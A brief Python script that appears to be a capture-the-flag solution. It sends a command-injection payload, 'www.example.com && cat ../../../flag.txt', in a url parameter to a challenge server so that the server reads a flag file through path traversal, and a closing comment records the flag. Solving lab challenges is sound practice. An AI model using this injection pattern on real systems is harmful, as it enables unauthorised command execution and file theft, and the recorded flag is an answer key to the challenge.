import requests
import urllib.parse

url = "http://recruit.osiris.bar:32006"
site = "www.example.com && cat ../../../flag.txt"
encoded_site = urllib.parse.quote(site)

response = requests.post(f"{url}/?url={encoded_site}")

print(response.text)

# flag{routers_do_this_all_of_the_time}
